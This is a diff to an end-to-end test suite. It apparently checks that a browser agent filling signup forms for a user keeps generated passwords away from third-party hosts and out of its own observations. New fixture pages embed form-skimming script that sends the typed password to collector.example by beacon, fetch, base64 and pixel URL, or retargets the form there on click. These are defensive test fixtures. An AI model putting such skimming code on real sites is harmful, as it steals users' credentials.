@@ -157,7 +157,7 @@ const PAGES: Record<string, string> = {
     });
     document.getElementById('join').addEventListener('submit', (event) => { event.preventDefault(); send(); });`,
   )}`,
-  '/prefilled': `<h1>Join</h1><label>Confirm password <input type="text" name="confirm_password" value="page-chosen-secret-value"></label>`,
+  '/prefilled': `<h1>Join</h1><label>Confirm password <input type="text" name="confirm_password" autocomplete="new-password" value="page-chosen-secret-value"></label>`,
   '/change': `<h1>Security</h1><form method="post" action="/account/change-password">${field('Current password', 'current_password', 'password', 'current-password')}${field('New password', 'new_password', 'password', 'new-password')}${field('Confirm new password', 'confirm_password', 'password', 'new-password')}<button type="submit">Change password</button></form>`,
   '/change-shown-account': `<h1>Security</h1><form method="post" action="/account/change-password"><label>Account <input type="email" name="email" autocomplete="username" value="${USERNAME}" readonly></label>${field('Current password', 'current_password', 'password', 'current-password')}${field('New password', 'new_password', 'password', 'new-password')}${field('Confirm new password', 'confirm_password', 'password', 'new-password')}<button type="submit">Change password</button></form>`,
   '/change-with-email': `<h1>Security</h1><form method="post" action="/account/change-password">${field('Current password', 'current_password', 'password', 'current-password')}${field('New password', 'new_password', 'password', 'new-password')}${field('Recovery email', 'recovery_email', 'email', 'email')}<button type="submit">Change password</button></form>`,
@@ -170,6 +170,16 @@ const PAGES: Record<string, string> = {
   '/trial': nativeForm('/signup', 'Start free trial'),
   '/order-total': `${nativeForm('/signup')}<p>Order total $10.00 due today, charged to your Visa card ending 4242.</p>`,
   '/ambiguous': nativeForm('/signup', 'Go'),
+  // The control's own handler points the form at another site only as it is pressed.
+  '/offsite-on-press': `${nativeForm('/signup')}<script>
+    document.querySelector('button').addEventListener('click', () => {
+      document.querySelector('form').action = 'https://collector.example/signup';
+    });
+  </script>`,
+  '/unmasked-confirmation': nativeForm('/signup').replace(
+    'type="password" name="password_confirmation"',
+    'type="text" name="password_confirmation"',
+  ),
   '/get-signup': nativeForm('/signup').replace('method="post"', 'method="get"'),
   '/marketing-terms': nativeForm(
     '/signup',
@@ -195,7 +205,6 @@ const PAGES: Record<string, string> = {
         .then((response) => response.text()).then((html) => { document.getElementById('result').innerHTML = html; });
     });
   </script>`,
-  '/agree-signup': nativeForm('/signup', 'Agree and create account'),
   // Each fill resets a box only the principal can agree to: the form shows it, unticked, once a password is typed.
   '/waiver-on-fill': `${nativeForm('/signup')}${onFill(`box('waiver', '${WAIVER}');`)}`,
   // The fill also moves the page to a new address, as a single-page app's router does.
@@ -215,6 +224,26 @@ const PAGES: Record<string, string> = {
     "document.getElementById('join').addEventListener('submit', (event) => { event.preventDefault(); send(); });",
     '/api/slow-signup',
   )}`,
+  // The site's own handler posts to its own host; a third-party script on it copies the new password elsewhere.
+  '/collecting-signup': `<h1>Join</h1><form id="join">${signupFields}<button type="submit">Create account</button></form><div id="result"></div><script>
+    const form = document.getElementById('join');
+    const password = form.querySelector('[name=password]');
+    password.addEventListener('input', () => navigator.sendBeacon('https://collector.example/typed', password.value));
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const value = password.value;
+      navigator.sendBeacon('https://collector.example/beacon', JSON.stringify({ field: value }));
+      fetch('https://collector.example/collect', { method: 'POST', mode: 'no-cors', body: value }).catch(() => {});
+      fetch('https://collector.example/encoded', { method: 'POST', mode: 'no-cors', body: btoa(value) }).catch(() => {});
+      fetch('https://collector.example/pixel?p=' + encodeURIComponent(value), { mode: 'no-cors' }).catch(() => {});
+      await fetch('https://collector.example/cdn/app.js', { mode: 'no-cors' }).catch(() => {});
+      // An invisible captcha checks with its own site as the form submits, and the signup waits for it.
+      const verified = await fetch('https://captcha.example/verify', { method: 'POST', mode: 'no-cors', body: 'token=widget-token' }).then(() => true, () => false);
+      if (!verified) return;
+      const response = await fetch('/api/signup', { method: 'POST', body: new URLSearchParams(new FormData(form)) });
+      document.getElementById('result').innerHTML = await response.text();
+    });
+  </script>`,
   '/verify-email': '<h1>Your email has been verified.</h1><p>Your account is ready.</p>',
   '/verify-email-quiet': '<h1>Shop</h1><p>Browse the catalogue.</p>',
 };
@@ -364,7 +393,11 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       socket.once('close', () => sockets.delete(socket));
     });
     proxy.on('connect', (request, socket, head) => {
-      if (!['accounts.shop.example:443', 'parent.example:443', 'collector.example:443'].includes(request.url ?? '')) {
+      if (
+        !['accounts.shop.example:443', 'parent.example:443', 'collector.example:443', 'captcha.example:443'].includes(
+          request.url ?? '',
+        )
+      ) {
         socket.destroy();
         return;
       }
@@ -811,12 +844,12 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       ['/checkout-action', 'purchase_control'],
       ['/trial', 'purchase_control'],
       ['/order-total', 'unsupported_control'],
-      ['/ambiguous', 'unsupported_control'],
+      ['/unmasked-confirmation', 'unsupported_form'],
     ] as const)
       it(`refuses ${path} as ${reason}`, async () => {
         await page.goto(`${SITE}${path}`);
         const authority = await signupAuthority();
-        const activate = path === '/trial' ? 'Start free trial' : path === '/ambiguous' ? 'Go' : 'Create account';
+        const activate = path === '/trial' ? 'Start free trial' : 'Create account';
         expect(await fill(authority, await refs({ ...SIGNUP, activate }))).toEqual({ status: 'refused', reason });
         await unexposed(authority);
       }, 30_000);
@@ -914,6 +947,35 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       }, 30_000);
   });
 
+  it("keeps a generated password on the site when the form's own handler sends it elsewhere", async () => {
+    remaining = 6_000;
+    const { authority, result } = await signUp('/offsite-on-press', SIGNUP);
+    expect(result).toEqual({ status: 'outcome_unknown' });
+    expect(posts.filter((post) => post.host === 'collector.example')).toEqual([]);
+    expect(await attempts.get(authority.id)).toMatchObject({ phase: 'unknown' });
+  }, 30_000);
+
+  it("keeps a generated password off other sites while the page's captcha and CDN requests still go", async () => {
+    const { result, password } = await signUp('/collecting-signup', SIGNUP);
+    expect(posts.filter((post) => post.host === 'collector.example')).toEqual([]);
+    expect(posts).toEqual([
+      { host: 'captcha.example', path: '/verify', body: 'token=widget-token' },
+      {
+        host: 'accounts.shop.example',
+        path: '/api/signup',
+        body: new URLSearchParams({
+          email: USERNAME,
+          password: password!,
+          password_confirmation: password!,
+        }).toString(),
+      },
+    ]);
+    expect(addresses.filter((address) => address.startsWith('collector.example'))).toEqual([
+      'collector.example/cdn/app.js',
+    ]);
+    expect(result).toEqual({ status: 'account_created' });
+  }, 30_000);
+
   describe('website outcomes', () => {
     for (const [response, status, phase] of [
       ['<p>An account with this email already exists.</p>', 'account_exists', 'rejected'],
@@ -938,10 +1000,13 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
   });
 
   describe('keeping values out of every agent surface', () => {
-    it('redacts old toggled, copied and cleared values and refuses screenshots of the tainted document', async () => {
+    it('never submits a password the page turned to text, and redacts its copies and refuses screenshots', async () => {
       responses.set('/api/signup', '<p>Check your email to verify your account.</p>');
+      remaining = 6_000;
       const { result, password } = await signUp('/masking', SIGNUP);
-      expect(result).toEqual({ status: 'verification_requested' });
+      // The value reached the page before its handler showed it: the host never presses, and the attempt stays open.
+      expect(result).toEqual({ status: 'outcome_unknown' });
+      expect(posts).toEqual([]);
       if (!password) throw new Error('no candidate');
       expect(await page.locator('[name=password]').getAttribute('type')).toBe('text');
       // Every input holding the value is cleared; the echoed text stays only in the page.
@@ -954,14 +1019,14 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       expect(JSON.stringify(shot)).not.toContain(password);
     }, 30_000);
 
-    it('treats a page-filled text-type confirmation field as secret', async () => {
+    it('treats a page-filled credential field as secret, whatever its type shows', async () => {
       await page.goto(`${SITE}/prefilled`);
       expect(JSON.stringify(await observePage(page))).not.toContain('page-chosen-secret-value');
       const shot = await executeBrowserBatch(context(), { actions: [{ kind: 'screenshot' }] }, { record: false });
       expect(shot).toMatchObject({ status: 'stopped', reason: 'secret_field' });
     }, 30_000);
 
-    it('keeps generic typing, keys and clicks out of the credential scope', async () => {
+    it('keeps generic typing and keys out of credential fields, a toggled one included', async () => {
       await page.goto(`${SITE}/masking`);
       await page.evaluate("document.querySelector('[name=password_confirmation]').type = 'text'");
       // Each action stops its batch and its observation renews the refs, so every step reads fresh ones.
@@ -987,9 +1052,6 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       expect(await batch(({ password }) => ({ kind: 'key', ...password, key: 'Enter' }))).toEqual(
         stopped('secret_field'),
       );
-      // A form that holds password fields is submitted only by the credential operation itself.
-      expect(await batch(({ activate }) => ({ kind: 'click', ...activate }))).toEqual(stopped('secret_field'));
-      expect(await batch(({ email }) => ({ kind: 'key', ...email, key: 'Enter' }))).toEqual(stopped('secret_field'));
       expect(posts).toEqual([]);
     }, 30_000);
   });
@@ -1055,22 +1117,17 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       expect(await anyChecked()).toBe(false);
     }, 30_000);
 
-    it("takes a signup form's own agree-and-create control as its activation", async () => {
-      const { result } = await signUp('/agree-signup', { ...SIGNUP, activate: 'Agree and create account' });
-      expect(result).toEqual({ status: 'account_created' });
-      expect(posts.map((post) => post.path)).toEqual(['/signup']);
-    }, 30_000);
-
-    for (const path of ['/agree-money', '/agree-outside'] as const)
-      it(`refuses the agree-and-create control on ${path} before disclosure`, async () => {
-        await page.goto(`${SITE}${path}`);
-        const authority = await signupAuthority();
-        expect(await fill(authority, await refs({ ...SIGNUP, activate: 'Agree and create account' }))).toEqual({
-          status: 'refused',
-          reason: 'unsupported_control',
-        });
-        expect(posts).toEqual([]);
-        expect(await attempts.get(authority.id)).toMatchObject({ exposed_at: null });
+    // The control's name is the site's own: it is refused only for what it commits to, never for its wording, and
+    // agreeing words on the control itself ask no consent of the principal.
+    for (const [path, activate] of [
+      ['/ambiguous', 'Go'],
+      ['/agree-money', 'Agree and create account'],
+      ['/agree-outside', 'Agree and create account'],
+    ] as const)
+      it(`takes ${path}'s own "${activate}" control as the signup's activation`, async () => {
+        const { result } = await signUp(path, { ...SIGNUP, activate });
+        expect(result).toEqual({ status: 'account_created' });
+        expect(posts.map((post) => post.path)).toEqual(['/signup']);
       }, 30_000);
   });
 
